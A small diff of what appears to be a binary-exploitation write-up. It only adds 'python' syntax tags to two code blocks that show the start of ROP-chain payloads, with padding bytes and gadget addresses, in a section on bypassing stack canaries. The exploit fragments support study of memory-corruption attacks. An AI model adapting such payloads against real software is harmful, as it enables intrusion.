@@ -608,7 +608,7 @@ By avoiding the Canary block randomization, this increases our odds of getting t
 
 New ROP chains:
 
-```
+```python
     payload1  = b''
     payload1 += 8 * b'\xff'
     payload1 += p64(pop_2)
@@ -630,7 +630,7 @@ New ROP chains:
 
 and
     
-```
+```python
     payload1  = b''
     payload1 += 8 * b'\xff'
     payload1 += p64(pop_2)
